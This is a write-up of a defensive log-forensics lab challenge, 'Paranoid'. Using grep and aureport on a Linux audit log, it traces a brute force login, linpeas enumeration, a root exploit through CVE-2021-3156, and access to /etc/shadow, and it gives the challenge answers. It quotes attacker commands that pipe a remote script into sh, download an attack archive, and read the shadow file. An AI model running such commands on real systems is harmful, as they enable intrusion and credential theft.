@@ -1,0 +1,58 @@
+SOURCE
+https://blueteamlabs.online/home/challenge/paranoid-e5e164befb
+
+STEPS TAKEN
+What account was compromised?
+I started by downloading the log file in Kali, so I can more easily parse these logs (for example, with something like grep). I then grepped:
+grep "account" '/home/jessi/audit.log' | grep "success"
+To filter out logs that were both successful and logged an associated account. The first logs to appear show an account of "btlo-admin"; however, the first logs showing an associated IP came from "btlo". This confirms that the correct answer is "btlo".
+
+What attack type was used to gain initial access?
+This time, grep was used to discover failed attempts to see if there are any clues there. At first, nothing seemed particularly interesting. However, after running:
+grep "btlo\"" '/home/jessi/audit.log'| grep "failed" | wc -l 
+Which returns how many lines (aka logs) were written for each failed attempt on that account, it is dicovered that there are 179 attempts.
+Considering how many attempts were made before a success was captured, this appears to be a brute force attack.
+
+What is the attacker's IP address? 
+The IP address found before, when the initial compromise was discovered, is the correct answer here: 192.168.4.155
+
+What tool was used to perform system enumeration?
+Here, I switched to using aureport. This tool has a function called --comm, which lists out commands run. However, that doesn't quite give the answer. I ran this command which reports on keystrokes:
+aureport --tty -if '/home/jessi/audit.log' 
+And found this line that looks interesting:
+6. 10/04/2021 20:23:37 468450 1001 pts1 49 sh "wget -O - http://192.168.4.155:8000/linpeas.sh | sh",<nl>
+Further research of the linpeas tool confirms that this is commonly used in reconnaissance.
+Answer: linpeas
+
+What is the name of the binary and pid used to gain root?
+After linpeas, the malicious actor is seen doing some "evil" things:
+9. 10/04/2021 20:26:36 480934 1001 pts1 49 sh "wget http://192.168.4.155:8000/evil.tar.gz",<nl>
+10. 10/04/2021 20:26:45 480944 1001 pts1 49 sh "ls",<nl>
+11. 10/04/2021 20:26:50 480947 1001 pts1 49 sh "tar zxvf evil.tar.gz",<nl>
+12. 10/04/2021 20:26:59 480982 1001 pts1 49 sh "cd evil",<nl>
+13. 10/04/2021 20:27:03 480984 1001 pts1 49 sh "ls",<nl>
+14. 10/04/2021 20:27:06 480987 1001 pts1 49 sh "make",<nl>
+15. 10/04/2021 20:27:10 481020 1001 pts1 49 sh "./evil 0",<nl>
+From here, the next task is to find the PID of this evil process:
+sudo aureport -p -if '/home/jessi/audit.log' | grep "evil"
+This returns:
+16152. 10/04/2021 20:27:17 829992 /home/btlo/evil/evil 59 1001 481021
+And finally, I looked up how Linux audit logs are organized to find out which of those numbers is the PID. I reran a grep:
+grep "evil" '/home/jessi/audit.log'
+And in this line, I saw the PID:
+type=SYSCALL msg=audit(1633393637.960:481021): arch=c000003e syscall=59 success=yes exit=0 a0=558c75091b38 a1=558c75091b70 a2=558c75091b88 a3=8 items=2 ppid=809662 pid=829992 auid=1001 uid=1001 gid=1001 euid=1001 suid=1001 fsuid=1001 egid=1001 sgid=1001 fsgid=1001 tty=pts1 ses=49 comm="evil" exe="/home/btlo/evil/evil" subj=unconfined key=(null)
+
+What CVE was exploited to gain root access?
+This is open source intelligence-based. This attack used a binary executable to gain root access on a Linux system. The logs also verify that the timeframe of this incident was in October of 2021. Therefore, any CVEs from 2026 (which are the first hits when you search) would likely be red herrings. Plugging in that bit of information into the search shows a CVE of CVE-2021-3156.
+
+What type of vulnerability is this?
+The first hit to find the CVE will give this answer - https://www.sentinelone.com/vulnerability-database/cve-2021-3156/
+Answer: heap-based buffer overflow
+
+What file was exfiltrated once root was gained?
+Go back to the aureport --tty -if '/home/jessi/audit.log' command and this line is found:
+19. 10/04/2021 20:27:45 481062 1001 pts1 49 sh "cat /etc/shadow",<nl>
+While the logs don't directly show that the file was exfiltrated, this is the only file accessed after exploitation and before exiting. This does, however, confirm that the information was accessed and potentially exfiltrated via other routes aside from the terminal.
+
+CONCLUSION
+The attacker ran a brute force attack to gain access to the btlo account. From there, they ran an "evil" binary that allowed root access (via a buffer overflow vulnerability). Finally, they were able to access the /etc/shadow file, which contains user password hashes.
